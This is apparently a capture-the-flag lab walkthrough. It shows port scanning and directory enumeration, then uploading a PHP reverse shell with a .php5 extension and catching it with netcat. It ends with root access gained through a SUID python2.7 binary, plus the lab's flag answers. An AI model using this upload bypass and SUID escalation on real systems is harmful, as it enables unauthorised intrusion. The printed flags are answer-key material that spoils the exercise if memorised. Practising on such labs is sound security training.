

***Task 2: Reconnaissance***


```
nmap -sS -sV -sC -A 10.49.151.6  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 08:56 -0400
Nmap scan report for 10.49.151.6
Host is up (0.070s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2c:26:73:2d:15:09:af:7e:9b:5c:52:58:d5:b8:71:63 (RSA)
|   256 a2:27:00:ef:07:a4:a6:33:7c:0a:f0:0e:63:71:31:a7 (ECDSA)
|_  256 e6:96:d5:eb:12:1f:5d:19:e5:6e:eb:da:76:66:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/6%OT=22%CT=1%CU=37529%PV=Y%DS=3%DC=T%G=Y%TM=6A241905
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=101%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%C
OS:I=Z%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GC
OS:D=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   68.82 ms 192.168.128.1
2   ...
3   69.87 ms 10.49.151.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.49 seconds
```

***Q1:Scan the machine, how many ports are open?***
***Ans:2***

***Q:What version of Apache is running?***

***Ans:2.4.41***
***Q3:What service is running on port 22?***
***Ans:SSH

***Q4:What is the hidden directory?***
***Ans:/panel/***


```
gobuster dir -u http://10.49.151.6 -w /usr/share/wordlists/dirb/common.txt                                                                         
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
css                  (Status: 301) [Size: 308] [--> http://10.49.151.6/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 307] [--> http://10.49.151.6/js/]
panel                (Status: 301) [Size: 310] [--> http://10.49.151.6/panel/]
server-status        (Status: 403) [Size: 276]
uploads              (Status: 301) [Size: 312] [--> http://10.49.151.6/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```

**Task 3: Getting a shell**


==http://10.49.158.161/panel/==

**upload the PHP reverse shell**
open ==http://10.49.158.161/uploads/shell.php5==

```
nc -nvlp 1234     
listening on [any] 1234 ...
connect to [192.168.234.105] from (UNKNOWN) [10.49.158.161] 37830
Linux ip-10-49-158-161 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:15:15 up 3 min,  0 users,  load average: 0.13, 0.35, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64

```

```
$ pwd
/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ python -c 'import pty;pty.spawn("/bin/bash")'
bash-5.0$ locate user.txt
locate user.txt
bash-5.0$ find / -type f -name "user.txt" 2>/dev/null..
find / -type f -name "user.txt" 2>/dev/null..
bash: /dev/null..: Permission denied
bash-5.0$ find / -type f -name "user.txt" 2>/dev/null

find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
bash-5.0$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
bash-5.0$ cd /var/www
cd /var/www
bash-5.0$ ls
ls
html  user.txt
bash-5.0$ cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}

```


***Task 4: Privilege escalation***

```
bash-5.0$ find / -user root -perm -4000 2>/dev/null..
find / -user root -perm -4000 2>/dev/null..
bash: /dev/null..: Permission denied
bash-5.0$ find / -user root -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
bash-5.0$  python -c 'import os;os.execl("/bin/bash", "sh", "-p")'
 python -c 'import os;os.execl("/bin/bash", "sh", "-p")'
sh-5.0# whomai
whomai
sh: whomai: command not found
sh-5.0# whoami
whoami
root
sh-5.0# ls
ls
html  user.txt
sh-5.0# find / -type f -name "root.txt" 2>/dev/null
find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
sh-5.0# cd ../../../
cd ../../../
sh-5.0# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
sh-5.0# cd root
cd root
sh-5.0# ls
ls
root.txt  snap
sh-5.0# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
sh-5.0#                   
```







